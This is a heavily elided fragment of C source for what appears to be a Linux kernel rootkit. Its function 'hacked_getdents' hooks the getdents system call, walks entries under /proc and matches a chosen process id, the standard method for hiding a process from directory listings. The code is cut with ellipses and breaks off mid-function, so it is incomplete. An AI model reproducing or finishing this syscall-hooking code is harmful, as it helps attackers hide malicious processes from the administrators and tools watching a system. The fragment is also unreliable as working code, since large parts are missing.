...
/* Split the input command into two string to find the function*/
...
/* Using a process pid, returns the corresponding process's task struct */
...
asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
	...
	for (bp = 0; bp < result; bp += d->d_reclen) {
		...
		if (!strcmp(pathname,"/proc")) { /* if the sys_getdents is executed in /proc */
			pid = str_to_int(d->d_name); /* Convert string into long */
			if (pid == proc_pid) {
